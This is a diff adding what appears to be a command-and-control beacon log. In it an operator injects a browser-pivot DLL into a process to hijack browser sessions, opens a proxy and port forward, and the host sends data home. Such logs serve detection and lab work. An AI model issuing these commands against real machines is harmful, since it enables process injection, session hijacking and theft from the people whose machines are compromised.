@@ -1,0 +1,18 @@
+01/06 05:03:23 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 10372; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+01/06 05:05:47 UTC [input] <neo> sleep 5
+01/06 05:05:47 UTC [task] <T1029> Tasked beacon to sleep for 5s
+01/06 05:06:16 UTC [checkin] host called home, sent: 16 bytes
+01/06 05:19:00 UTC [checkin] host called home, sent: 12 bytes
+01/06 05:19:07 UTC [input] <neo> browserpivot 13036 x64
+01/06 05:19:07 UTC [task] <T1111, T1055, T1185> Injecting browser pivot DLL into 13036 (x64)
+01/06 05:19:07 UTC [output]
+Browser Pivot HTTP proxy is at: 193.168.88.146:47363
+
+01/06 05:19:07 UTC [output]
+started port forward on 63701 to 127.0.0.1:63701
+
+01/06 05:19:10 UTC [checkin] host called home, sent: 88096 bytes
+01/06 06:05:04 UTC [checkin] host called home, sent: 27 bytes
+01/06 06:05:04 UTC [output]
+beacon exit.
+
